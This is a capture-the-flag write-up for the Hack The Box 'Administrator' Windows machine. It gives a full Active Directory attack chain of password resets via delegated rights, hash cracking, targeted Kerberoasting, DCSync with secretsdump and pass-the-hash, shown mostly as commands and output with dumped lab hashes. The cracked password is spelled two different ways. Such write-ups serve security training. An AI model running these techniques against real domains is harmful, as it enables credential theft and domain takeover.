---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - DcSync
---
# Overview

| Name        | Administrator |
| ----------- | ------------- |
| OS          | Windows       |
| Base Points | Medium [30]   |
| Status      | Done          |
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: `Olivia` Password: `ichliebedich`
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.90.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 03:50 CDT
Nmap scan report for 10.129.90.107
Host is up (0.16s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-15 15:50:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-15T15:50:58
|_  start_date: N/A
```

```bash
$ echo "10.129.90.107 administrator.htb" | sudo tee -a /etc/hosts
10.129.90.107 administrator.htb
```
# Initial Foothold

```bash
$ bloodhound-python -d administrator.htb -u olivia -p 'ichliebedich' -ns 10.129.90.107 -c All
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 30S
```

```bash
sudo neo4j console
bloodhound
```

![[administrator.png]]

![[administrator2.png]]

Olivia has `GenericAll` to Michael and Michael has `ForceChangePassword` to Benjamin.

```bash
$ # Reset Michael's password
bloodyAD -d administrator.htb -u olivia -p 'ichliebedich' -H 10.129.90.107 set password Michael 'NewPassword123!'
[+] Password changed successfully!
```

```bash
$ # Change Benjamin's password using Michael's account
bloodyAD -d administrator.htb -u Michael -p 'NewPassword123!' -H 10.129.90.107 set password Benjamin 'BenjaminPass123!'
[+] Password changed successfully!
```

```bash
$ ftp 10.129.90.107
Connected to 10.129.90.107.
220 Microsoft FTP Service
Name (10.129.90.107:root): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||51749|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||51751|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************|   952        5.87 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (5.86 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

We get password `tekieromucho`.

```bash
pwsafe Backup.psafe3 
```

```
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

```bash
# Test SMB access
nxc smb 10.129.90.107 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
nxc smb 10.129.90.107 -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'
nxc smb 10.129.90.107 -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'

# Test WinRM access
nxc winrm 10.129.90.107 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
nxc winrm 10.129.90.107 -u alexander -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'
nxc winrm 10.129.90.107 -u emma -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur'
```

```bash
$ nxc winrm 10.129.90.107 -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.129.90.107   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.129.90.107   5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

```bash
$ evil-winrm -i 10.129.90.107 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
a22293f7e25a175b12047d0d50aff4de
```
# Privilege Escalation

![[administrator3.png]]

Emily has **GenericWrite** on Ethan, which means you can:

- Perform Targeted Kerberoasting on Ethan

```bash
$ python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$f74ea63e20033b8bb2815a75716cb93f$b59f08aac9ea29031c77e9eab6c26c207bdad3b52fbe9d952fdf9c45a9f4518aa1e61c1d458e4fe06dade8b2f8c52436784559dc63dca1c6fccab55a2eabc48d0968cbd9c285b66623e303c03d41baa48048fc84577a81b390f385605c78eb96f8012ac54dfef4017de4f442da2bb38026d3fbad33a7b340db6ba79aa98d214c9e94d5d8b1a6a845f82dee67e4f3b0414bda7741a8462ef2641e13335b12194b5a9337df28b3e6c2f624733aa2dcffac56ba70b863f62fba0e26b36987702d54a05e41140a99fae5cb4baa76e1a1787431cc015fe5df6c4dbdbab976f00c106803d728e20b423bb9e9db6e079e1fd8cc7d3143762975400334b4bfff67089e9e27a18e2593a891001dff3637d6a2711b6c3b808729c1f9133e261b50bcecb867811f4c7556703b50f703ddd5f85a730c6476da463affde59be27f4efd18d34476ec4270d1c13ae273b9b531c9a15ac1eb5994c89cae2e22682e6f22c322e25df0b3b28f9dbfa89e91b8e12c8b81817f3db38bdf977a41ee237cdf0739b24716b8f1bc461e1276ba1e729315e6bd41beb8cb35c0f76adb9ebd2fe694508faee6909c6560ba65f8269069dc24369bec62f2012f13702ecc51bd73660affbea4309384d7ba8e55fd6e253a209efa090c3f05d4fb16ba55ea8f96a5f0a62ebce34d8349d581f8b19c313ebc4282178ac4083760910e9ede513c6ca2b2b97c336c556531c37fbd7495b476d18a95518aa9e2c973670d4b3060c6d18ef16f383080566547c7668e37d458795f0014a0c7a21eacbb7b4e63d7c68ab8183955184e3758ccd16344d2a346d2f83a84b3bf91f44cc204752786d09e2a50576c889e80ca79bdb3eaec84e2f1dfdf531d83f0d69b678adea6f75a45e4ce217d91b48d5d9d1ec1ec0b2e65396a2646985c67b74e83a2976502304c41ac5a75e1c533938091e3f72db3ea2780adb44fe20f0f7d0ee1ba0649d346e070a0e52d85624f11a8a932c5960d94de227d171628021597ad12ce16902e2efb5fbce63b122f4ab984f10ecb9f033299bd1d620540818a5b0f1450f20916b3fa106c8bc2432a5eb0e8f49a477e276c6e256ae424b2bd850451454aa2b9d982d511e332c765c129f850a371b86f4ffb509423cdb7b5ce46ce5448b943b2e4a95e3350916e69761ccd3f53df402a134b3bf3f7912f78afc024b811ecb92884f815f92986b8e0f8eecf2a10f5fc18421dc3ad91a3c5780621d0ddcf76c25f133829000dcd917733a13d12781e6c527d6488e906f97e4af7df6699025801a3b0b68b0a73850cacb79dcc2feb95fcd7b8385b77a547a1a66859d7e2d045bbacc8b7450b091c140bb4549401b764a0dda01fdaedfce45d7025ea93411d94d8e1f9b29a5575ba4e27892e977a562f628052f97029550b1ef791134db3ac0cb288e3e2f9f5c6ce6679a35d454cdc1c109723fb5deec071220821a30641a4894bb1f86c76c34ceaa3b179f5e7080d4d8cf75d344f0970b7f23b5b8f791562db00ad1d5980068c9a91aeb4e2c75fbfc
```

```bash
hashcat -m 13100 ethan_hash.txt /usr/share/wordlists/rockyou.txt
```

We get password `impbizkit`.
## DCSync

![[administrator4.png]]

```bash
$ # Dump all domain hashes using Ethan's account (he has DCSync rights)
secretsdump.py administrator.htb/ethan:limpbizkit@10.129.90.107
Impacket v0.13.0.dev0+20250813.95021.3e63dae - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:0ef3298edfc59e0cd07c56d829eea9c6:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:cdd880092287f4e31309d4c7c52ae52a:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:2bea6d73374af597736f2333e51d6094da5e4a1b50882e5f68792cfb55f54f1d
administrator.htb\michael:aes128-cts-hmac-sha1-96:23190caab969ab6f206da0d287199d77
administrator.htb\michael:des-cbc-md5:197ffb469d2f151c
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:b343d0e0837752db4c1fddb6fb741f4fd59a37ac9ed2e6afe6585be9a86ee2a0
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:d7b0551d33337c90c2ebc122bb4032e1
administrator.htb\benjamin:des-cbc-md5:0761ecc7b6cd49d5
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

```bash
$ evil-winrm -i 10.129.90.107 -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
8016dca6838610eea9579e9d83501e9b
```

---
